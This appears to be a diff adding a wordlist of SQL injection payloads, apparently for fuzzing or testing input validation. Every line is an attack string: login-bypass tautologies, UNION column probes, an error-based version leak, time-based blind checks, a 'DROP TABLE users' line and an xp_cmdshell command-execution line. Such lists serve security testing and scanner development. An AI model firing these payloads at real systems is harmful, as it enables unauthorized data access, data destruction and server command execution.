@@ -1,0 +1,23 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR 1=1--
+admin' --
+admin' #
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=1--
+'; DROP TABLE users--
+1' ORDER BY 1--
+1' ORDER BY 10--
+' WAITFOR DELAY '00:00:05'--
+1'; EXEC xp_cmdshell('ping 127.0.0.1')--
+' OR 'a'='a
+') OR ('a'='a
+')) OR (('a'='a
+' OR EXISTS(SELECT * FROM users)--
+admin'--
+1' AND SLEEP(5)--
+1' AND BENCHMARK(5000000,MD5('A'))--
